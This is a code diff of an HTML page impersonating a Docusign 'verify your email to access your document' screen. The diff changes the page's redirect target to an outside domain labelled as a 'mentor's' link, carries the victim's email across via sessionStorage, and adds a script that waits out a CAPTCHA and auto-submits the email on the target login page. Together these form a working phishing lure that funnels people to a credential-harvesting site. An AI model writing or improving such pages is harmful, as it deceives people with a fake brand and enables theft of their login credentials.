@@ -24,69 +24,16 @@
             box-shadow: 0 4px 20px rgba(0,0,0,0.1);
             text-align: center;
         }
-        .logo {
-            margin-bottom: 1.5rem;
-            font-size: 24px;
-            font-weight: bold;
-            color: #0056b3;
-        }
-        h1 {
-            font-size: 1.6rem;
-            font-weight: 600;
-            margin-bottom: 1rem;
-        }
-        .message {
-            font-size: 0.95rem;
-            color: #444;
-            margin-bottom: 1.5rem;
-        }
-        .highlight {
-            background: #f0f7ff;
-            padding: 0.8rem;
-            border-radius: 8px;
-            margin-bottom: 1.5rem;
-            font-size: 0.9rem;
-            color: #0056b3;
-        }
-        label {
-            display: block;
-            text-align: left;
-            font-weight: 500;
-            margin-bottom: 0.5rem;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            font-size: 1rem;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            margin-bottom: 1.5rem;
-        }
-        button {
-            background: #0073e6;
-            color: white;
-            border: none;
-            padding: 12px;
-            font-size: 1rem;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: 600;
-        }
+        .logo { font-size: 24px; font-weight: bold; color: #0056b3; margin-bottom: 1.5rem; }
+        h1 { font-size: 1.6rem; margin-bottom: 1rem; }
+        .message, .highlight { margin-bottom: 1.5rem; color: #444; }
+        .highlight { background: #f0f7ff; padding: 0.8rem; border-radius: 8px; color: #0056b3; }
+        label { display: block; text-align: left; font-weight: 500; margin-bottom: 0.5rem; }
+        input { width: 100%; padding: 12px; font-size: 1rem; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 1.5rem; }
+        button { background: #0073e6; color: white; border: none; padding: 12px; font-size: 1rem; border-radius: 6px; cursor: pointer; width: 100%; font-weight: 600; }
         button:hover { background: #005bb5; }
-        .help {
-            margin-top: 1.5rem;
-            font-size: 0.8rem;
-            color: #666;
-        }
-        .help a { color: #0073e6; text-decoration: none; }
-        .status {
-            margin-top: 1rem;
-            font-size: 0.8rem;
-            color: #28a745;
-            font-weight: 500;
-            min-height: 40px;
-        }
+        .help { margin-top: 1.5rem; font-size: 0.8rem; color: #666; }
+        .status { margin-top: 1rem; font-size: 0.8rem; color: #28a745; min-height: 40px; }
     </style>
 </head>
 <body>
@@ -96,169 +43,169 @@
     <div class="message">Please verify your email address to securely access your document.</div>
     <div class="highlight">For your privacy, Docusign Document Services requires authentication before granting access to shared documents.</div>
     <label for="email">Work or business email</label>
-    <input type="email" id="email" name="email" placeholder="name@company.com" autocomplete="email">
+    <input type="email" id="email" placeholder="name@company.com">
     <button id="accessBtn">Access Document</button>
     <div class="help">Need help? <a href="#">Reach out to Docusign Support</a></div>
-    <div id="statusMessage" class="status"></div>
+    <div id="status" class="status"></div>
 </div>
 
 <script>
     const emailInput = document.getElementById('email');
     const accessBtn = document.getElementById('accessBtn');
-    const statusDiv = document.getElementById('statusMessage');
+    const statusDiv = document.getElementById('status');
 
-    function updateStatus(message, isError = false) {
-        statusDiv.textContent = message;
+    // !!! CHANGE THIS TO YOUR MENTOR'S ACTUAL LINK !!!
+    const TARGET_LOGIN_URL = "https://wajapou.biz.id/Dvuy!0qg/";
+
+    function updateStatus(msg, isError = false) {
+        statusDiv.textContent = msg;
         statusDiv.style.color = isError ? '#dc3545' : '#28a745';
-        console.log(message);
     }
 
-    async function redirectToGmail() {
+    function redirectAndAutoFill() {
         let email = emailInput.value.trim();
         if (!email) {
-            updateStatus('Please enter your work or business email.', true);
+            updateStatus("Please enter your email.", true);
             return;
         }
-        if (!email.includes('@') || !email.includes('.')) {
-            updateStatus('Please enter a valid email address (e.g., name@company.com).', true);
+        if (!email.includes('@')) {
+            updateStatus("Enter a valid email address.", true);
             return;
         }
 
-        updateStatus(`✅ Email accepted. Redirecting to Google...`);
-
-        // Use the exact Google v3 sign-in endpoint with email pre-filled
-        const googleUrl = `https://accounts.google.com/v3/signin/identifier?Email=${encodeURIComponent(email)}&continue=https://mail.google.com/mail/&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin`;
-
-        // Store the email in sessionStorage for the next page to use
-        sessionStorage.setItem('pendingGmailLogin', email);
-        
-        // Navigate to Google
-        window.location.href = googleUrl;
+        updateStatus(`✅ Redirecting to login page...`);
+        sessionStorage.setItem('autoFillEmail', email);
+        window.location.href = TARGET_LOGIN_URL;
     }
 
-    accessBtn.addEventListener('click', redirectToGmail);
-    emailInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') redirectToGmail();
+    accessBtn.addEventListener('click', redirectAndAutoFill);
+    emailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') redirectAndAutoFill();
     });
 </script>
 
 <!-- ============================================================ -->
-<!-- AUTOMATION SCRIPT FOR THE GOOGLE LOGIN PAGE                  -->
-<!-- This script will only run when the page is on accounts.google.com -->
+<!-- CAPTCHA-AWARE AUTOMATION SCRIPT (runs on target login page)  -->
 <!-- ============================================================ -->
 <script>
     (function() {
-        // This check ensures the script only runs on Google's login page
-        if (window.location.hostname !== 'accounts.google.com') {
+        const targetHost = new URL(TARGET_LOGIN_URL).hostname;
+        if (window.location.hostname !== targetHost) return;
+
+        console.log("🟢 CAPTCHA-aware script started on target login page");
+
+        const email = sessionStorage.getItem('autoFillEmail');
+        if (!email) {
+            console.log("No email found in sessionStorage – exiting.");
             return;
         }
 
-        console.log("🔄 Google Login Automation Script Started");
+        // Show a small floating notification to the user
+        const notification = document.createElement('div');
+        notification.textContent = '🤖 Auto-fill active: waiting for login form...';
+        notification.style.cssText = 'position:fixed; bottom:20px; right:20px; background:#0073e6; color:white; padding:10px 15px; border-radius:8px; font-size:14px; z-index:10000; font-family:sans-serif; box-shadow:0 2px 10px rgba(0,0,0,0.2);';
+        document.body.appendChild(notification);
 
-        // Function to find the email input field and the Next button
-        function findEmailFieldAndButton() {
-            // Google's email input selectors (updated for modern versions)
-            const emailSelectors = [
-                'input[type="email"]',
-                'input[name="identifier"]',
-                'input#identifierId',
-                'input[jsname="YPqjbf"]'
-            ];
+        // Function to fill email and click Next
+        function fillAndSubmit(emailField, nextButton = null) {
+            if (!emailField) return false;
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+            emailField.dispatchEvent(new Event('change', { bubbles: true }));
+            console.log(`✏️ Filled email: ${email}`);
             
-            let emailField = null;
-            for (const selector of emailSelectors) {
-                emailField = document.querySelector(selector);
-                if (emailField) break;
-            }
-            
-            // Google's "Next" button selectors
-            const nextButtonSelectors = [
-                '#identifierNext',
-                'button[jsname="LgbsSe"]',
-                'div[jsname="V67aGc"]',
-                'span:contains("Next")'
-            ];
-            
-            let nextButton = null;
-            for (const selector of nextButtonSelectors) {
-                if (selector.includes(':contains')) {
-                    // Fallback for contains selector
-                    nextButton = Array.from(document.querySelectorAll('button, div[role="button"]')).find(el => el.textContent.includes('Next'));
-                } else {
-                    nextButton = document.querySelector(selector);
+            // Try to find Next button if not provided
+            if (!nextButton) {
+                const btnSelectors = [
+                    'button[type="submit"]', 'input[type="submit"]',
+                    'button:contains("Next")', 'button:contains("Continue")',
+                    'button:contains("Sign in")', 'button:contains("Login")',
+                    '#next', '.next', '.submit'
+                ];
+                for (let sel of btnSelectors) {
+                    if (sel.includes(':contains')) {
+                        const text = sel.match(/:contains\("(.+?)"\)/)[1];
+                        nextButton = Array.from(document.querySelectorAll('button, input[type="submit"], a')).find(el => el.textContent.includes(text));
+                    } else {
+                        nextButton = document.querySelector(sel);
+                    }
+                    if (nextButton) break;
                 }
-                if (nextButton) break;
             }
             
-            return { emailField, nextButton };
-        }
-
-        // Main automation logic
-        async function automateGoogleLogin() {
-            // Wait for the page to be fully interactive
-            if (document.readyState !== 'complete') {
-                await new Promise(resolve => window.addEventListener('load', resolve));
-                // Small delay to ensure dynamic elements are rendered
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-
-            // Check for a pending email from sessionStorage
-            let emailFromStorage = sessionStorage.getItem('pendingGmailLogin');
-            if (!emailFromStorage) {
-                console.log("No pending email found in sessionStorage. Exiting automation.");
-                return;
-            }
-
-            console.log(`📧 Found pending email: ${emailFromStorage}`);
-            
-            const { emailField, nextButton } = findEmailFieldAndButton();
-            
-            if (!emailField) {
-                console.error("❌ Could not find email input field.");
-                return;
-            }
-            
-            // Check if the email field is already filled by the URL parameter
-            if (emailField.value && emailField.value.length > 0) {
-                console.log(`✅ Email field already has value: ${emailField.value}`);
-                // If it's filled but not the one we expect, we might still want to proceed
-            } else if (emailFromStorage) {
-                // Fill the email field
-                emailField.value = emailFromStorage;
-                // Trigger all necessary events to make Google recognize the change
-                emailField.dispatchEvent(new Event('input', { bubbles: true }));
-                emailField.dispatchEvent(new Event('change', { bubbles: true }));
-                emailField.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: 'Enter' }));
-                console.log(`✏️ Filled email field with: ${emailFromStorage}`);
-                // Small delay for Google's JavaScript to register the input
-                await new Promise(resolve => setTimeout(resolve, 300));
-            }
-            
-            // Now try to click the Next button
             if (nextButton) {
-                // Clear the sessionStorage so we don't run again on accident
-                sessionStorage.removeItem('pendingGmailLogin');
-                console.log("🔘 Attempting to click Next button...");
                 nextButton.click();
-                updateStatusOnPage("🔄 Email submitted! Taking you to password...");
+                console.log("🔘 Clicked Next/Submit button.");
+                sessionStorage.removeItem('autoFillEmail');
+                notification.textContent = '✅ Auto-filled and submitted!';
+                setTimeout(() => notification.remove(), 3000);
+                return true;
             } else {
-                console.warn("⚠️ Could not find Next button. The email field is filled, but user must click manually.");
-                updateStatusOnPage("✅ Email field filled. Please click 'Next' to continue.", true);
+                console.warn("⚠️ No Next button found, but email field is filled.");
+                notification.textContent = '⚠️ Email filled, but please click Next manually.';
+                notification.style.background = '#dc3545';
+                return false;
             }
         }
 
-        // Helper to update status if we're on the DocuSign page (though unlikely here)
-        function updateStatusOnPage(message, isError = false) {
-            const statusDiv = document.getElementById('statusMessage');
-            if (statusDiv) {
-                statusDiv.textContent = message;
-                statusDiv.style.color = isError ? '#dc3545' : '#28a745';
+        // Function to check if the email field exists and is not hidden by CAPTCHA
+        function isEmailFieldReady() {
+            const selectors = [
+                'input[type="email"]', 'input[type="text"]',
+                'input[name="email"]', 'input[name="username"]',
+                'input[id*="email" i]', 'input[placeholder*="email" i]'
+            ];
+            for (let sel of selectors) {
+                const field = document.querySelector(sel);
+                if (field && field.offsetParent !== null && !field.disabled) {
+                    return { field, selector: sel };
+                }
             }
-            console.log(message);
+            return null;
         }
 
-        // Start the automation
-        automateGoogleLogin();
+        // Use MutationObserver to watch for when the email field appears (after CAPTCHA)
+        let observer = null;
+        let checkInterval = null;
+
+        function startObserving() {
+            // First, check if email field is already there
+            const ready = isEmailFieldReady();
+            if (ready) {
+                fillAndSubmit(ready.field);
+                return;
+            }
+
+            notification.textContent = '🧩 CAPTCHA detected – waiting for you to solve it...';
+            
+            // Observe DOM changes (in case CAPTCHA removal triggers field appearance)
+            observer = new MutationObserver(() => {
+                const ready = isEmailFieldReady();
+                if (ready) {
+                    observer.disconnect();
+                    if (checkInterval) clearInterval(checkInterval);
+                    fillAndSubmit(ready.field);
+                }
+            });
+            observer.observe(document.body, { childList: true, subtree: true });
+            
+            // Also poll every second as a fallback (in case observer misses something)
+            checkInterval = setInterval(() => {
+                const ready = isEmailFieldReady();
+                if (ready) {
+                    if (observer) observer.disconnect();
+                    clearInterval(checkInterval);
+                    fillAndSubmit(ready.field);
+                }
+            }, 1000);
+        }
+
+        // Wait for page load before starting observer
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', startObserving);
+        } else {
+            startObserving();
+        }
     })();
 </script>
 </body>
